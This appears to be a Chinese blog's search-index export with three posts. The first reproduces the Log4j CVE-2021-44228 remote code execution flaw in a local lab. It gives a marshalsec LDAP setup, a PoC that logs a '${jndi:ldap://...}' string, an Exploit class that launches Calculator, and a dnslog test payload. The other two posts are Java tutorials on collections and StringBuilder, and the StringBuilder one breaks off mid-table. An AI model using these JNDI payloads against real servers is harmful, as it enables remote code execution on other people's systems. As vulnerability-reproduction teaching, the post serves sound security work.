<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Log4j远程代码执行漏洞复现</title>
      <link href="/2021/12/10/Log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2021/12/10/Log4j%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><hr><ul><li>漏洞编号：CVE-2021-44228</li><li>漏洞级别：0day</li><li>Apache <strong>Log4j2</strong>是一个基于Java的日志记录工具。由于Apache Log4j2某些功能存在递归解析功能，攻击者可直接构造恶意请求，触发远程代码执行漏洞。漏洞利用无需特殊配置，Apache Struts2、Apache Solr、Apache Druid、Apache Flink等均受影响。</li><li>漏洞适用版本为2.0 &lt;&#x3D; Apache log4j2 &lt;&#x3D; 2.14.1，只需检测Java应用是否引入 log4j-api , log4j-core 两个jar。若存在应用使用，极大可能会受到影响。</li><li>修复方法：升级Apache Log4j2所有相关应用到 &gt;&#x3D;log4j-2.15.0-rc2 版本</li></ul><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><ul><li>当log4j打印的日志内容中包含<code>$&#123;jndi:ldap://ip&#125;</code>时，服务端程序就会通过ldap协议访问ip这个地址，若访问的是一个包含java代码的class文件的地址，程序会通过此地址下载class文件并在服务端主机执行class文件中的任何命令。</li></ul><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><h3 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h3><ul><li><p>LDAP，<strong>轻型目录访问协议</strong>，是一个开放的，中立的，工业标准的<a href="https://baike.baidu.com/item/%E5%BA%94%E7%94%A8%E5%8D%8F%E8%AE%AE">应用协议</a>，通过<a href="https://baike.baidu.com/item/IP%E5%8D%8F%E8%AE%AE">IP协议</a>提供访问控制和维护分布式信息的目录信息。是一个访问在线<a href="https://baike.baidu.com/item/%E7%9B%AE%E5%BD%95%E6%9C%8D%E5%8A%A1">目录服务</a>的协议。可使用<a href="https://github.com/mbechler/marshalsec">marshalsec</a>开启LDAP服务，具体操作为</p><p>使用**<a href="https://github.com/mbechler/marshalsec">marshalsec</a>**开启LDAP服务</p><p>1.下载marshalsec后进入文件夹编译</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p>2.然后进入target目录启动</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">java -<span class="built_in">cp</span> marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer <span class="string">&quot;http://127.0.0.1:8888/#Exploit&quot;</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h3><ul><li><p>创建Maven项目，并将以下配置文件加入pom.xml中：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.logging.log4j<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>log4j-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.14.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span>÷</span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>创建LogTest.java，即poc，用于测试客户端。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.LogManager;</span><br><span class="line"><span class="keyword">import</span> org.apache.logging.log4j.Logger;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">LogTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Logger</span> <span class="variable">logger</span> <span class="operator">=</span> LogManager.getLogger();</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        logger.error(<span class="string">&quot;$&#123;jndi:ldap://localhost:1389/Exploit&#125;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>创建Exploit.java，并使用java c命令在本目录生成Exploit.class，当访问通过jndi访问localhost:1389&#x2F;Exploit时服务端会执行此文件。</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Exploit</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.err.println(<span class="string">&quot;Pwned&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">terminal</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator&quot;</span>; </span><br><span class="line">         <span class="comment">//定义在服务端要执行的命令，本条执行效果为打开计算器。Windows命令为&quot;calc&quot;</span></span><br><span class="line">            Runtime.getRuntime().exec(terminal);</span><br><span class="line">        &#125; <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><p><strong><a href="https://github.com/EZLC/log4j-rce">代码地址</a></strong></p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p><img src="https://ez-1320201298.cos.ap-guangzhou.myqcloud.com/img/log4j.png"></p><ul><li>至此已成功复现此远程执行代码漏洞。</li></ul><h2 id="漏洞镜像"><a href="#漏洞镜像" class="headerlink" title="漏洞镜像"></a>漏洞镜像</h2><ul><li><p><a href="https://mp.weixin.qq.com/s/4cvooT4tfQhjL7t4GFzYFQ">Log4J 漏洞复现+漏洞靶场</a></p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker pull registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">docker run -it -d -p 8080:8080 --name log4j_vuln_container registry.cn-hangzhou.aliyuncs.com/fengxuan/log4j_vuln</span><br><span class="line">docker <span class="built_in">exec</span> -it log4j_vuln_container /bin/bash</span><br><span class="line">/bin/bash /home/apache-tomcat-8.5.45/bin/startup.sh</span><br></pre></td></tr></table></figure></li><li><p>启动后访问<code>http://ip:8080/webstudy/</code>，post传参c&#x3D;<code>$&#123;jndi:ldap://xxx.dnslog.cn/exp&#125;</code>，即可在dnslog上看到结果。</p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaEE </tag>
            
            <tag> 安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>集合类库</title>
      <link href="/2017/05/29/%E9%9B%86%E5%90%88%E7%B1%BB%E5%BA%93/"/>
      <url>/2017/05/29/%E9%9B%86%E5%90%88%E7%B1%BB%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="集合的概述（重点）"><a href="#集合的概述（重点）" class="headerlink" title="集合的概述（重点）"></a>集合的概述（重点）</h2><hr><h3 id="集合的由来"><a href="#集合的由来" class="headerlink" title="集合的由来"></a>集合的由来</h3><ul><li>当需要在Java程序中记录单个数据内容时，则声明一个变量。</li><li>当需要在Java程序中记录多个类型相同的数据内容时，声明一个一维数组。 </li><li>当需要在Java程序中记录多个类型不同的数据内容时，则创建一个对象。 </li><li>当需要在Java程序中记录多个类型相同的对象数据时，创建一个对象数组。 </li><li>当需要在Java程序中记录多个类型不同的对象数据时，则准备一个集合。</li></ul><h3 id="集合的框架结构"><a href="#集合的框架结构" class="headerlink" title="集合的框架结构"></a>集合的框架结构</h3><ul><li>Java中集合框架顶层框架是：java.util.Collection集合  和 java.util.Map集合。 </li><li>其中Collection集合中存取元素的基本单位是：单个元素。</li><li>其中Map集合中存取元素的基本单位是：单对元素。</li></ul><h2 id="Collection集合（重点）"><a href="#Collection集合（重点）" class="headerlink" title="Collection集合（重点）"></a>Collection集合（重点）</h2><hr><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.Collection接口是List接口、Queue 接口以及Set接口的父接口，因此该接口里定义的方法既可用于操作List集合，也可用于操作Queue集合和Set集合。</li></ul><h3 id="常用的方法（练熟、记住）"><a href="#常用的方法（练熟、记住）" class="headerlink" title="常用的方法（练熟、记住）"></a>常用的方法（练熟、记住）</h3><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>boolean add(E e);</td><td>向集合中添加对象</td></tr><tr><td>boolean addAll(Collection&lt;? extends E&gt; c)</td><td>用于将参数指定集合c中的所有元素添加到当前集合中</td></tr><tr><td>boolean contains(Object o);</td><td>判断是否包含指定对象</td></tr><tr><td>boolean containsAll(Collection&lt;?&gt; c)</td><td>判断是否包含参数指定的所有对象</td></tr><tr><td>boolean retainAll(Collection&lt;?&gt; c)</td><td>保留当前集合中存在且参数集合中存在的所有对象</td></tr><tr><td>boolean remove(Object o);</td><td>从集合中删除对象</td></tr><tr><td>boolean removeAll(Collection&lt;?&gt; c)</td><td>从集合中删除参数指定的所有对象</td></tr><tr><td>void clear();</td><td>清空集合</td></tr><tr><td>int size();</td><td>返回包含对象的个数</td></tr><tr><td>boolean isEmpty();</td><td>判断是否为空</td></tr><tr><td>boolean equals(Object o)</td><td>判断是否相等</td></tr><tr><td>int hashCode()</td><td>获取当前集合的哈希码值</td></tr><tr><td>Object[] toArray()</td><td>将集合转换为数组</td></tr><tr><td>Iterator iterator()</td><td>获取当前集合的迭代器</td></tr></tbody></table><h2 id="Iterator接口（重点）"><a href="#Iterator接口（重点）" class="headerlink" title="Iterator接口（重点）"></a>Iterator接口（重点）</h2><hr><h3 id="基本概念-1"><a href="#基本概念-1" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.Iterator接口主要用于描述迭代器对象，可以遍历Collection集合中的所有元素。</li><li>java.util.Collection接口继承Iterator接口，因此所有实现Collection接口的实现类都可以使用该迭代器对象。</li></ul><h3 id="常用的方法"><a href="#常用的方法" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>boolean hasNext()</td><td>判断集合中是否有可以迭代&#x2F;访问的元素</td></tr><tr><td>E next()</td><td>用于取出一个元素并指向下一个元素</td></tr><tr><td>void remove()</td><td>用于删除访问到的最后一个元素</td></tr></tbody></table><ul><li>案例题目：<br>如何使用迭代器实现toString方法的打印效果？</li></ul><h2 id="for-each循环（重点）"><a href="#for-each循环（重点）" class="headerlink" title="for each循环（重点）"></a>for each循环（重点）</h2><hr><h3 id="基本概念-2"><a href="#基本概念-2" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>Java5推出了增强型for循环语句，可以应用数组和集合的遍历。 </li><li>是经典迭代的“简化版”。</li></ul><h3 id="语法格式"><a href="#语法格式" class="headerlink" title="语法格式"></a>语法格式</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(元素类型  变量名 : 数组/集合名称) &#123; </span><br><span class="line">循环体;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="执行流程"><a href="#执行流程" class="headerlink" title="执行流程"></a>执行流程</h3><ul><li>不断地从数组&#x2F;集合中取出一个元素赋值给变量名并执行循环体，直到取完所有元素为止。</li></ul><h2 id="List集合（重中之重）"><a href="#List集合（重中之重）" class="headerlink" title="List集合（重中之重）"></a>List集合（重中之重）</h2><hr><h3 id="基本概念-3"><a href="#基本概念-3" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.List集合是Collection集合的子集合，该集合中允许有重复的元素并且有先后放入次序。 </li><li>该集合的主要实现类有：ArrayList类、LinkedList类、Stack类、Vector类。</li><li>其中ArrayList类的底层是采用动态数组进行数据管理的，支持下标访问，增删元素不方便。 </li><li>其中LinkedList类的底层是采用双向链表进行数据管理的，访问不方便，增删元素方便。</li><li>可以认为ArrayList和LinkedList的方法在逻辑上完全一样，只是在性能上有一定的差别，ArrayList 更适合于随机访问而LinkedList更适合于插入和删除；在性能要求不是特别苛刻的情形下可以忽略这个差别。 </li><li>其中Stack类的底层是采用动态数组进行数据管理的，该类主要用于描述一种具有后进先出特征的数据结构，叫做栈(last in ﬁrst out  LIFO)。</li><li>其中Vector类的底层是采用动态数组进行数据管理的，该类与ArrayList类相比属于线程安全的类，效率比较低，以后开发中基本不用。</li></ul><h3 id="常用的方法-1"><a href="#常用的方法-1" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>void add(int index, E element)</td><td>向集合中指定位置添加元素</td></tr><tr><td>boolean addAll(int index, Collection&lt;? extends E&gt; c)</td><td>向集合中添加所有元素</td></tr><tr><td>E get(int index)</td><td>从集合中获取指定位置元素</td></tr><tr><td>int indexOf(Object o)</td><td>查找参数指定的对象</td></tr><tr><td>int lastIndexOf(Object o)</td><td>反向查找参数指定的对象</td></tr><tr><td>E set(int index, E element)</td><td>修改指定位置的元素</td></tr><tr><td>E remove(int index)</td><td>删除指定位置的元素</td></tr><tr><td>List subList(int fromIndex, int toIndex)</td><td>用于获取子List</td></tr></tbody></table><ul><li>案例题目<br>准备一个Stack集合，将数据11、22、33、44、55依次入栈并打印，然后查看栈顶元素并打印，<br>然后将栈中所有数据依次出栈并打印。<br>再准备一个Stack对象，将数据从第一个栈中取出来放入第二个栈中，然后再从第二个栈中取出并<br>打印。</li></ul><h2 id="Queue集合（重点）"><a href="#Queue集合（重点）" class="headerlink" title="Queue集合（重点）"></a>Queue集合（重点）</h2><hr><h3 id="基本概念-4"><a href="#基本概念-4" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.Queue集合是Collection集合的子集合，与List集合属于平级关系。</li><li>该集合的主要用于描述具有先进先出特征的数据结构，叫做队列(ﬁrst in ﬁrst out FIFO)。 </li><li>该集合的主要实现类是LinkedList类，因为该类在增删方面比较有优势。</li></ul><h3 id="常用的方法-2"><a href="#常用的方法-2" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>boolean oﬀer(E e)</td><td>将一个对象添加至队尾，若添加成功则返回true</td></tr><tr><td>E poll()</td><td>从队首删除并返回一个元素</td></tr><tr><td>E peek()</td><td>返回队首的元素（但并不删除）</td></tr></tbody></table><ul><li>案例题目<br>准备一个Queue集合，将数据11、22、33、44、55依次入队并打印，然后查看队首元素并打印，<br>然后将队列中所有数据依次出队并打印。</li></ul><h2 id="泛型机制（熟悉）"><a href="#泛型机制（熟悉）" class="headerlink" title="泛型机制（熟悉）"></a>泛型机制（熟悉）</h2><hr><h3 id="基本概念-5"><a href="#基本概念-5" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>通常情况下集合中可以存放不同类型的对象，是因为将所有对象都看做Object类型放入的，因此从集合中取出元素时也是Object类型，为了表达该元素真实的数据类型，则需要强制类型转换， 而强制类型转换可能会引发类型转换异常。</li><li>为了避免上述错误的发生，从Java5开始增加泛型机制，也就是在集合名称的右侧使用&lt;数据类型&gt;的方式来明确要求该集合中可以存放的元素类型，若放入其它类型的元素则编译报错。</li><li>泛型只在编译时期有效，在运行时期不区分是什么类型。</li></ul><h3 id="底层原理"><a href="#底层原理" class="headerlink" title="底层原理"></a>底层原理</h3><ul><li>泛型的本质就是参数化类型，也就是让数据类型作为参数传递，其中E相当于形式参数负责占位， 而使用集合时&lt;&gt;中的数据类型相当于实际参数，用于给形式参数E进行初始化，从而使得集合中所 有的E被实际参数替换，由于实际参数可以传递各种各样广泛的数据类型，因此得名为泛型。 </li><li>如：<br>&#x2F;&#x2F;其中i叫做形式参数，负责占位<br>其中E叫做形式参数，负责占位<br>&#x2F;&#x2F;int i &#x3D; 10;                                                                        E &#x3D; String;<br>&#x2F;&#x2F;int i &#x3D; 20;                                                                        E &#x3D; Integer;<br>public static void show(int i) {                                       public interface List {<br>    …                                                                                           …<br>}                                                                                          }<br>&#x2F;&#x2F;其中10叫做实际参数，负责给形式参数初始化           &#x2F;&#x2F;其中String叫做实际参数<br>show(10);                                                                          List lt1 &#x3D; …;<br>show(20);                                                                          List lt2 &#x3D; …;</li></ul><h3 id="自定义泛型接口"><a href="#自定义泛型接口" class="headerlink" title="自定义泛型接口"></a>自定义泛型接口</h3><ul><li>泛型接口和普通接口的区别就是后面添加了类型参数列表，可以有多个类型参数，如：&lt;E, T, .. &gt; 等。</li></ul><h3 id="自定义泛型类"><a href="#自定义泛型类" class="headerlink" title="自定义泛型类"></a>自定义泛型类</h3><ul><li>泛型类和普通类的区别就是类名后面添加了类型参数列表，可以有多个类型参数，如：&lt;E, T, .. &gt; 等。</li><li>实例化泛型类时应该指定具体的数据类型，并且是引用数据类型而不是基本数据类型。 </li><li>父类有泛型，子类可以选择保留泛型也可以选择指定泛型类型。</li><li>子类必须是“富二代”，子类除了指定或保留父类的泛型，还可以增加自己的泛型。</li></ul><h3 id="自定义泛型方法"><a href="#自定义泛型方法" class="headerlink" title="自定义泛型方法"></a>自定义泛型方法</h3><ul><li>泛型方法就是我们输入参数的时候，输入的是泛型参数，而不是具体的参数。我们在调用这个泛型 方法的时需要对泛型参数进行实例化。</li><li>泛型方法的格式：<br>[访问权限] &lt;泛型&gt; 返回值类型  方法名([泛型标识  参数名称]) { 方法体; } </li><li>在静态方法中使用泛型参数的时候，需要我们把静态方法定义为泛型方法。</li></ul><h3 id="泛型在继承上的体现"><a href="#泛型在继承上的体现" class="headerlink" title="泛型在继承上的体现"></a>泛型在继承上的体现</h3><ul><li>如果B是A的一个子类或子接口，而G是具有泛型声明的类或接口，则G并不是G的子类型！<br>比如：String是Object的子类，但是List并不是List的子类。</li></ul><h3 id="通配符的使用"><a href="#通配符的使用" class="headerlink" title="通配符的使用"></a>通配符的使用</h3><ul><li>有时候我们希望传入的类型在一个指定的范围内，此时就可以使用泛型通配符了。</li><li>如：之前传入的类型要求为Integer类型，但是后来业务需要Integer的父类Number类也可以传<br>入。</li><li>泛型中有三种通配符形式：<?> 无限制通配符：表示我们可以传入任意类型的参数。<? extends E> 表示类型的上界是E，只能是E或者是E的子类。 <? super E> 表示类型的下界是E，只能是E或者是E的父类。</li></ul><hr><h2 id="Set集合（熟悉）"><a href="#Set集合（熟悉）" class="headerlink" title="Set集合（熟悉）"></a>Set集合（熟悉）</h2><h3 id="基本概念-6"><a href="#基本概念-6" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.Set集合是Collection集合的子集合，与List集合平级。 </li><li>该集合中元素没有先后放入次序，且不允许重复。</li><li>该集合的主要实现类是：HashSet类  和 TreeSet类以及LinkedHashSet类。 </li><li>其中HashSet类的底层是采用哈希表进行数据管理的。</li><li>其中TreeSet类的底层是采用红黑树进行数据管理的。其中LinkedHashSet类与HashSet类的不同之处在于内部维护了一个双向链表，链表中记录了元<br>素的迭代顺序，也就是元素插入集合中的先后顺序，因此便于迭代。</li></ul><h3 id="常用的方法-3"><a href="#常用的方法-3" class="headerlink" title="常用的方法"></a>常用的方法</h3><ul><li>参考Collection集合中的方法即可！ </li><li>案例题目<br>准备一个Set集合指向HashSet对象，向该集合中添加元素”two”并打印，再向集合中添加元<br>素”one”并打印，再向集合中添加元素”three”并打印，再向集合中添加”one”并打印。</li></ul><h3 id="元素放入HashSet集合的原理"><a href="#元素放入HashSet集合的原理" class="headerlink" title="元素放入HashSet集合的原理"></a>元素放入HashSet集合的原理</h3><ul><li><p>使用元素调用hashCode方法获取对应的哈希码值，再由某种哈希算法计算出该元素在数组中的索引位置。</p></li><li><p>若该位置没有元素，则将该元素直接放入即可。</p></li><li><p>若该位置有元素，则使用新元素与已有元素依次比较哈希值，若哈希值不相同，则将该元素直接放入。</p></li><li><p>若新元素与已有元素的哈希值相同，则使用新元素调用equals方法与已有元素依次比较。 </p></li><li><p>若相等则添加元素失败，否则将元素直接放入即可。<br>思考：为什么要求重写equals方法后要重写hashCode方法呢?</p></li><li><p>解析：<br>当两个元素调用equals方法相等时证明这两个元素相同，重写hashCode方法后保证这两个元<br>素得到的哈希码值相同，由同一个哈希算法生成的索引位置相同，此时只需要与该索引位置已有元<br>素比较即可，从而提高效率并避免重复元素的出现。</p></li></ul><h3 id="TreeSet集合的概念"><a href="#TreeSet集合的概念" class="headerlink" title="TreeSet集合的概念"></a>TreeSet集合的概念</h3><ul><li>二叉树主要指每个节点最多只有两个子节点的树形结构。 </li><li>满足以下3个特征的二叉树叫做有序二叉树。<br>a.左子树中的任意节点元素都小于根节点元素值；<br>b.右子树中的任意节点元素都大于根节点元素值；<br>c.左子树和右子树的内部也遵守上述规则；</li><li>由于TreeSet集合的底层采用红黑树进行数据的管理，当有新元素插入到TreeSet集合时，需要使<br>用新元素与集合中已有的元素依次比较来确定新元素的合理位置。</li><li>比较元素大小的规则有两种方式：<br>使用元素的自然排序规则进行比较并排序，让元素类型实现java.lang.Comparable接口；<br>使用比较器规则进行比较并排序，构造TreeSet集合时传入java.util.Comparator接口； </li><li>自然排序的规则比较单一，而比较器的规则比较多元化，而且比较器优先于自然排序；</li></ul><h2 id="Map集合（重点）"><a href="#Map集合（重点）" class="headerlink" title="Map集合（重点）"></a>Map集合（重点）</h2><hr><h3 id="基本概念-7"><a href="#基本概念-7" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.Map&lt;K,V&gt;集合中存取元素的基本单位是：单对元素，其中类型参数如下：<br>K - 此映射所维护的键(Key)的类型，相当于目录。<br>V - 映射值(Value)的类型，相当于内容。</li><li>该集合中key是不允许重复的，而且一个key只能对应一个value。</li><li>该集合的主要实现类有：HashMap类、TreeMap类、LinkedHashMap类、Hashtable类、Properties类。</li><li>其中HashMap类的底层是采用哈希表进行数据管理的。 </li><li>其中TreeMap类的底层是采用红黑树进行数据管理的。</li><li>其中LinkedHashMap类与HashMap类的不同之处在于内部维护了一个双向链表，链表中记录了元素的迭代顺序，也就是元素插入集合中的先后顺序，因此便于迭代。</li><li>其中Hashtable类是古老的Map实现类，与HashMap类相比属于线程安全的类，且不允许null作为key或者value的数值。</li><li>其中Properties类是Hashtable类的子类，该对象用于处理属性文件，key和value都是String类型的。</li><li>Map集合是面向查询优化的数据结构, 在大数据量情况下有着优良的查询性能。经常用于根据key检索value的业务场景。</li></ul><h3 id="常用的方法-4"><a href="#常用的方法-4" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>V put(K key, V value)</td><td>将Key-Value对存入Map，若集合中已经包含该Key，则替换该Key所对应的Value，返回值为该Key原来所对应的Value，若没有则返回null</td></tr><tr><td>V get(Object key)</td><td>返回与参数Key所对应的Value对象，如果不存在则返回null</td></tr><tr><td>boolean containsKey(Object key);</td><td>判断集合中是否包含指定的Key</td></tr><tr><td>boolean containsValue (Object value);</td><td>判断集合中是否包含指定的Value</td></tr><tr><td>V remove(Object key)</td><td>根据参数指定的key进行删除</td></tr><tr><td>Set keySet()</td><td>返回此映射中包含的键的Set视图</td></tr><tr><td>Collection values()</td><td>返回此映射中包含的值的Set视图</td></tr><tr><td>Set&lt;Map.Entry&lt;K,V&gt;&gt; entrySet()</td><td>返回此映射中包含的映射的Set视图</td></tr></tbody></table><h3 id="元素放入HashMap集合的原理"><a href="#元素放入HashMap集合的原理" class="headerlink" title="元素放入HashMap集合的原理"></a>元素放入HashMap集合的原理</h3><ul><li>使用元素的key调用hashCode方法获取对应的哈希码值，再由某种哈希算法计算在数组中的索引位置。</li><li>若该位置没有元素，则将该键值对直接放入即可。</li><li>若该位置有元素，则使用key与已有元素依次比较哈希值，若哈希值不相同，则将该元素直接放入。</li><li>若key与已有元素的哈希值相同，则使用key调用equals方法与已有元素依次比较。 </li><li>若相等则将对应的value修改，否则将键值对直接放入即可。</li></ul><h3 id="相关的常量"><a href="#相关的常量" class="headerlink" title="相关的常量"></a>相关的常量</h3><ul><li>DEFAULT_INITIAL_CAPACITY : HashMap的默认容量是16。 </li><li>DEFAULT_LOAD_FACTOR：HashMap的默认加载因子是0.75。 </li><li>threshold：扩容的临界值，该数值为：容量*填充因子，也就是12。</li><li>TREEIFY_THRESHOLD：若Bucket中链表长度大于该默认值则转化为红黑树存储，该数值是8。 </li><li>MIN_TREEIFY_CAPACITY：桶中的Node被树化时最小的hash表容量，该数值是64。</li></ul><h2 id="Collections类"><a href="#Collections类" class="headerlink" title="Collections类"></a>Collections类</h2><hr><h3 id="基本概念-8"><a href="#基本概念-8" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>java.util.Collections类主要提供了对集合操作或者返回集合的静态方法。</li></ul><h3 id="常用的方法-5"><a href="#常用的方法-5" class="headerlink" title="常用的方法"></a>常用的方法</h3><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static &lt;T extends Object &amp; Comparable&lt;? super T&gt;&gt; T max(Collection&lt;? extends T&gt; coll)</td><td>根据元素的自然顺序返回给定集合的最大元素</td></tr><tr><td>static T max(Collection&lt;? extends T&gt; coll, Comparator&lt;? super T&gt; comp)</td><td>根据指定比较器引发的顺序返回给定集合的最大元素</td></tr><tr><td>static &lt;T extends Object &amp; Comparable&lt;?super T&gt;&gt; T min(Collection&lt;? extends T&gt; coll)</td><td>根据元素的自然顺序返回给定集合的最小元素</td></tr><tr><td>static T min(Collection&lt;? extends T&gt; coll, Comparator&lt;? super T&gt; comp)</td><td>根据指定比较器引发的顺序返回给定集合的最小元素</td></tr><tr><td>static void copy(List&lt;? super T&gt; dest, List&lt;? extends T&gt; src)</td><td>将一个列表中的所有元素复制到另一个列表中</td></tr></tbody></table><table><thead><tr><th>方发声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>static void reverse(List&lt;?&gt; list)</td><td>反转指定列表中元素的顺序</td></tr><tr><td>static void shuﬄe(List&lt;?&gt; list)</td><td>使用默认的随机源随机置换指定的列表</td></tr><tr><td>static &lt;T extends Comparable&lt;? super T&gt;&gt; void sort(List list)</td><td>根据其元素的自然顺序将指定列表按升序排序</td></tr><tr><td>static void sort(List list, Comparator&lt;? super T&gt; c)</td><td>根据指定比较器指定的顺序对指定列表进行排序</td></tr><tr><td>static void swap(List&lt;?&gt; list, int i, int j)</td><td>交换指定列表中指定位置的元素</td></tr></tbody></table><hr>]]></content>
      
      
      <categories>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaSE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>可变字符串类和日期相关类</title>
      <link href="/2017/05/28/%E5%8F%AF%E5%8F%98%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%92%8C%E6%97%A5%E6%9C%9F%E7%9B%B8%E5%85%B3%E7%B1%BB/"/>
      <url>/2017/05/28/%E5%8F%AF%E5%8F%98%E5%AD%97%E7%AC%A6%E4%B8%B2%E7%B1%BB%E5%92%8C%E6%97%A5%E6%9C%9F%E7%9B%B8%E5%85%B3%E7%B1%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="可变字符串类（重点）"><a href="#可变字符串类（重点）" class="headerlink" title="可变字符串类（重点）"></a>可变字符串类（重点）</h2><hr><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><ul><li>由于String类描述的字符串内容是个常量不可改变，当需要在Java代码中描述大量类似的字符串时，只能单独申请和存储，此时会造成内存空间的浪费。</li><li>为了解决上述问题，可以使用java.lang.StringBuilder类和java.lang.StringBuﬀer类来描述字符序 列可以改变的字符串，如：”ab”。</li><li>StringBuﬀer类是从jdk1.0开始存在，属于线程安全的类，因此效率比较低。 </li><li>StringBuilder类是从jdk1.5开始存在，属于非线程安全的类，效率比较高。</li></ul><h3 id="StringBuilder类常用的构造方法"><a href="#StringBuilder类常用的构造方法" class="headerlink" title="StringBuilder类常用的构造方法"></a>StringBuilder类常用的构造方法</h3><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>StringBuilder()</td><td>使用无参方式构造对象，容量为16</td></tr><tr><td>StringBuilder(int capacity)</td><td>根据参数指定的容量来构造对象，容量为参数指定大小</td></tr><tr><td>StringBuilder(String str)</td><td>根据参数指定的字符串来构造对象，容量为：16+字符串长度</td></tr></tbody></table><h3 id="StringBuilder类常用的成员方法"><a href="#StringBuilder类常用的成员方法" class="headerlink" title="StringBuilder类常用的成员方法"></a>StringBuilder类常用的成员方法</h3><table><thead><tr><th>方法声明</th><th>功能介绍</th></tr></thead><tbody><tr><td>int capacity()</td><td>用于返回调用对象的容量</td></tr><tr><td>int length()</td><td>用于返回字符串的长度，也就是字符的个数</td></tr><tr><td>StringBuilder insert(int oﬀset, String str)</td><td>插入字符串并返回调用对象的引用，就是自己。</td></tr><tr><td>StringBuilder append(String str)</td><td>追加字符串</td></tr><tr><td>StringBuilder deleteCharAt(int 